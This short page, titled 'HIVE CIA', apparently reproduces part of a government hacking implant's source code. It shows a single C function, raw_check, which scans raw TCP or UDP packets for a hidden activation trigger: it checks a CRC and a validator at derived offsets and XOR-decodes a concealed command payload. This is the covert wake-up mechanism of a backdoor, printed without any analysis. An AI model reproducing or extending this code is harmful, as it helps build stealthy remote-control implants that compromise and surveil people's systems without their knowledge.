# HIVE CIA

![https://p5.ssl.qhimg.com/t010f3d7fd9bdd46d57.png](images/t010f3d7fd9bdd46d57.png)

```c
// Constants for raw TCP and UDP triggers
#define	MIN_PACKET_SIZE		126
#define	MAX_PACKET_SIZE		472
#define START_PAD		8
#define CRC_DATA_LENGTH		84
#define RANDOM_PAD1		200
#define RANDOM_PAD2		146
#define PAD1			8
#define PAD2			8

#define ID_KEY_HASH_SIZE	20	// Size of SHA-1 hash
#define ID_KEY_LENGTH_MIN	8	// Minimum character length for a trigger key

//******************************************************************
/*!
 * raw_check
 * @param incload	- Raw TCP payload pointer
 * @param pktlen	- Packet length
 * @param p		- Trigger payload pointer
 * @return
 * @retval SUCCESS (0)
 * @retval FAILURE (-1)
 *
 * raw_check accepts a pointer to the raw TCP or UDP payload and returns
 * the trigger payload in the buffer pointed to by p.
 *
 */
int
raw_check (uint8_t *data, uint16_t pktlen, Payload *p)
{
	uint16_t crc = 0;
	uint8_t *fieldPtr;			// Packet field pointer
	uint16_t uint16buf = 0;
	uint16_t netcrc;
	uint16_t validator;
	uint8_t *payloadKeyIndex;
	uint8_t *payloadIndex;
	int i;				// Loop counter
	uint8_t *pp;

	//////////////////////////////////////////////////////////////////////////////////////////////////////
	// NOTE: Memcpy is used in this function to prevent unaligned memory accesses in Sparc architectures.
	//////////////////////////////////////////////////////////////////////////////////////////////////////

	pp = (uint8_t *)p;
	// Compute the checksum of bytes between START_PAD and CRC.
	crc = tiny_crc16 ((unsigned char *) ((char *) data + START_PAD), CRC_DATA_LENGTH);

	// Get the CRC at the offset START_PAD + CRC_DATA_LENGTH + CRC % 200 into the packet.
	fieldPtr = data + START_PAD + CRC_DATA_LENGTH + (crc % 200);	// Set field pointer to the location of the CRC
	if (fieldPtr == 0 || (fieldPtr > (data + pktlen)))		// Make sure it's within bounds
		return FAILURE;

	DL(6);
	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
	netcrc = ntohs(uint16buf);
	DLX(6, printf ("CRC is 0x%0x into data, NET CRC = 0x%2.2x\n", (unsigned int)(fieldPtr - data), netcrc));

	if (crc != netcrc) {
		DLX(6, printf ("CRC = 0x%2.2x, CRC check failed\n", crc));
		return FAILURE;			// Check 1 failure: CRCs don't match
	}

	fieldPtr += sizeof(crc);
	memcpy(&uint16buf, fieldPtr, sizeof(uint16_t));
	validator = ntohs(uint16buf);
	DLX(6, printf ("Validator location: 0x%0x, Trigger validator = %d\n", (unsigned int)(fieldPtr - data), validator));
	if ( (validator % 127) != 0) {
		DLX(6, printf ("Validator check failed: validator = 0x%2.2x\n", validator));
		return FAILURE;			// Check 2 failure: integer not divisible by 127
	}

	fieldPtr += sizeof(validator) + PAD1;		// Update field pointer to point to trigger payload.
	payloadIndex = fieldPtr;
	payloadKeyIndex = (uint8_t *)(data + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(Payload))));	// Compute the start of the payload key
	DLX(6, printf("Encoded Payload offset\t0x%0x, Payload key offset: 0x%0x\tPayload follows:\n", (unsigned int)(fieldPtr - data), (unsigned int)(payloadKeyIndex - (uint8_t *)data)));
	for (i = 0; i < (int)sizeof(Payload); i++) {
		uint8_t trigger;

		trigger = payloadKeyIndex[i] ^ payloadIndex[i];			// XOR the trigger payload with the key
		DLX(6, printf ("\tByte[%2.2d]: encoded payload = 0x%2.2x,  payloadKey= 0x%2.2x, decoded payload = 0x%2.2x\n", i, payloadIndex[i], payloadKeyIndex[i], trigger));
		memcpy((void *)(pp + i), (void *)&trigger, sizeof(uint8_t));
	}
	DLX(6, printf ("\n"));
	return SUCCESS;
}
```

